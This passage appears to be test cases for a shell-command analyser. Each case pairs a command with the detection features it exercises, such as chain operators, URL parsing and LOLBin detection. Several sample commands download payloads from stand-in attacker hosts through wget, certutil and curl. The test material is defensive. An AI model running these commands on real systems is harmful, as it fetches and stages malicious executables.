   Tests: Pipe operator detection

   Command: tar -xzf archive.tar.gz
   Tests: Archive tool detection, extract indicator, compression indicator

7. wget_port
   Command: wget http://evil.com:8080/drop.sh
   Tests: Port extraction from URL, domain extraction, path suppression

8. certutil_lolbin
   Command: certutil -urlcache -split -f http://bad.com/a.exe a.exe
   Tests: LOLBin detection, Windows platform detection

9. chain_operator
   Command: mkdir /tmp/work && cd /tmp/work
   Tests: Chain operator (&&) detection

    Command: curl -o payload.exe http://1.2.3.4/payload.exe
    Tests: False-positive suppression for filenames in domains
